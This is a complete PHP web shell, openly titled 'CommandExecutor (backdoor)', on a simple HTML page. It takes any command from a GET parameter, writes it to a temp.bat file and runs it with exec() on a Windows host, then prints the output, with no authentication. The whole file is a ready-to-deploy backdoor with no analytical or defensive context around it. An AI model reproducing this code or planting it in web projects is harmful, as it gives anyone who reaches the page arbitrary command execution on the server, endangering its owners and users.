<!DOCTYPE html>
<html>
<head>
    <link rel="stylesheet" href="https://www.w3schools.com/w3css/5/w3.css">
</head>
<body>
<div>
    CommandExecutor (backdoor)
    <br>
    Command output below
    <br>
    <form action="index2.php" method="GET">
        <textarea name="command" style="width:75%; height:50px;"></textarea>
        <input type="submit" value="Execute!">
    </form>
    <?php
    $cmd = $_GET['command'];
    if ($cmd == null) {
        echo '<a class="w3-red">No command</a>';
    } else {
        echo "Command: " . $cmd . "<br><br>";
        echo '<div class="w3-text-white w3-black w3-padding w3-section">';
        $out = null;
        $file = fopen("temp.bat", "w");
        fwrite($file, "cd C:/\nchcp 437\n" . $cmd);
        fclose($file);
        exec("temp.bat", $out);
        foreach ($out as $x) {
            echo "$x <br>";
        }
        echo "</div>";
    }
    ?>
    
    <br>
</div>
</body>

</html>




